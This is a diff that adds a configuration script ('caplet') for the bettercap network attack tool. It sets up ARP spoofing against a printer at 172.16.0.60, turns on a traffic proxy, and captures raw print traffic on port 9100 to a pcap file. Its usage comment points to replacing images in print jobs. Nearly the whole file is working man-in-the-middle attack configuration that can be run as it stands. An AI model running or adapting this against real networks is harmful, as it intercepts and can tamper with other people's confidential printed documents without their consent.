@@ -1,0 +1,24 @@
+# usage:
+# sudo ./bettercap -caplet replace-images.cap -eval "set arp.spoof.targets 192.168.1.64"
+
+# detect all devices in subnet:
+#net.recon on
+#net.probe on
+#sleep 5
+#net.probe off
+#net.recon off
+
+# redirect tcp traffic to a proxy and filter PostScript:
+any.proxy on
+#http.proxy on
+#https.proxy on
+set net.sniff.filter port 9100
+set net.sniff.output print-jobs.pcap
+net.sniff on
+
+# configure arp.spoofing for specified Printer:
+#set arp.spoof.internal true
+#set arp.spoof.fullduplex true
+#set arp.spoof.targets  172.16.0.3, 172.16.0.60
+set arp.spoof.targets  172.16.0.60
+arp.spoof on
